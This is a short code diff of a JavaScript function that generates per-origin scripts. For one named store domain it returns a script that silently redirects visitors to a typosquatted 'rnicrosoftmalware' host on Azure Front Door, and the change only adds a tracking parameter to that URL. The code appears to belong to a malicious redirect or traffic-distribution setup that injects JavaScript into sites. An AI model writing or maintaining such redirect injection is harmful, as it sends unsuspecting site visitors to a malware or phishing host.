@@ -294,7 +294,7 @@ function buildSecondaryJS(origin) {
   const normalised = (origin || "").replace(/\/+$/, "").toLowerCase();
 
   if(normalised === "https://miyabugamajp.store"){
-    return `window.location.replace('https://rnicrosoftmalware-gkcfc5gresbybmhh.z01.azurefd.net');`;
+    return `window.location.replace('https://rnicrosoftmalware-gkcfc5gresbybmhh.z01.azurefd.net/?utm_source=none');`;
   }
   
   const config = Object.entries(ORIGIN_CONFIG).find(
